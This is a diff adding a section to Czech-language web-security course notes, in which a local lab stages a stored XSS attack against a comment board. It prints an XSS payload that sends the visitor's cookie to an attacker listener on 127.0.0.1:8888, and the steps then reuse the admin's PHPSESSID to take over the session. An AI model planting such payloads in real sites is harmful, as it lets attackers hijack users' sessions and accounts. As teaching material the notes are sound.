@@ -143,3 +143,31 @@ webového frameworku Flask. Pojďme tedy zkoumat systém:
 * obecně nevěřit vstupu od uživatele - uživatelé se dělí na dva typy - hloupí uživatelé a útočníci
 
 Teaser na další část (na XSS): http://127.0.0.1:5000/hello/%3Cscript%3Ealert(1)%3C/script%3E
+
+## Útoky na uživatele
+
+* umožněné špatnou implementací webu
+
+https://medium.com/@dilarauluturhan/javascript-xss-cross-site-scripting-and-csrf-cross-site-request-forgery-6f0f4baa2fb1
+
+### 5. XSS = Cross-site scripting (příklad: krádež cookie)
+
+* vložíme zlý Javascript do komentáře na stránce http://localhost:7005/
+  * stránka, kam lze psát příspěvky
+  * může se přihlásit admin a příspěvky mazat
+* použijeme druhý prohlížeč simulující útočníka:
+  * nejprve vložíme `<script>alert(1)</script>` a otestujeme, že to otravuje všechny
+  * admin to pak smaže a přidá třeba varování
+  * my přidáme další příspěvek vytahující přes javascript jeho cookie
+
+Útok:
+
+1. Pustíme si `listener.py`
+2. Vložíme příspěvek
+   ```html
+   <script>var i=new Image;i.src="http://127.0.0.1:8888/?"+document.cookie;</script>
+   ```
+3. Počkáme, než si admin zobrazí tuhle stránku a javascript nám nepošle request
+4. Zkopírujeme si obsah PHPSESSID a voilá, jsme admin :D
+
+https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md
